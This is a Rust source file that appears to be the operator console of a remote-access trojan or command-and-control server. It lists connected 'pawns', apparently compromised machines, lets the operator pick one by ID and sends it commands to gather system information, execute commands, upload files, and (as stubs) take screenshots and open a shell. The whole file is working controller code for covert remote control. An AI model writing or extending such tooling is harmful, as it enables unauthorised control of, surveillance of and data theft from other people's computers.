use std::io::{prelude::*, *};
use std::str::FromStr;
use crate::pawn::{ops,*};
use crate::socket;
use crate::help::*;

pub fn find_pawn_index(uid: u32) -> usize {
    let mut index: usize = 0;

    unsafe {
        for pawn in socket::current_pawns.iter() {
            if pawn.uid() == uid { 
                break
            }
            index += 1;
        }
    }

    index
}

#[allow(unused_assignments)]
pub fn pawn_controller() {
    let mut pawn: &mut Pawn;
    let mut ibuf = String::new();
    let mut pawn_index: usize = 0;

    loop {
        print!("[PawnID] => ");
        let (_, _) = (stdout().flush(), stdin().read_line(&mut ibuf));
        match ibuf.trim() {
            "quit" => return,
            _ => {
                if ibuf.trim().is_empty() {continue;}
                let pawnid = u32::from_str(ibuf.trim());
                ibuf = String::new();
                match pawnid {
                    Ok(puid) => {
                        pawn_index = find_pawn_index(puid);
                        unsafe {
                            if pawn_index == socket::current_pawns.len() {
                                eprintln!("[err] no such pawn was found!");
                                continue;
                            }
                        }
                    },
                    Err(_) => {eprintln!("[err] invalid digit");continue;},
                }
            }
        }

        pawn = unsafe {&mut socket::current_pawns[pawn_index]};

        println!("{OPS_MENU}");
        loop {
            print!("[{}]=> ", pawn.uid());
            let (_, _) = (stdout().flush(), stdin().read_line(&mut ibuf));
            match ibuf.trim() {
                "quit" => {ibuf = String::new();break;},
                "scrshot" => (),
                "sysinfo" => ops::sysinfo(pawn.stream()),
                "exec" => ops::exec_cmd(pawn.stream()),
                "shell" => (),
                "upload" => {
                    print!("[src + dst]=> ");
                    ibuf = String::new();
                    let (_,_) = (stdout().flush(), stdin().read_line(&mut ibuf));
                    let ibufs = ibuf.trim().split(' ').collect::<Vec<&str>>();
                    let (src,dst) = (ibufs[0], ibufs[1]);
                    let _ = ops::upload(src, dst, pawn.stream());
                },
                _ => eprintln!("[err] unknown command!")
            }
            ibuf = String::new();
        }
    }
}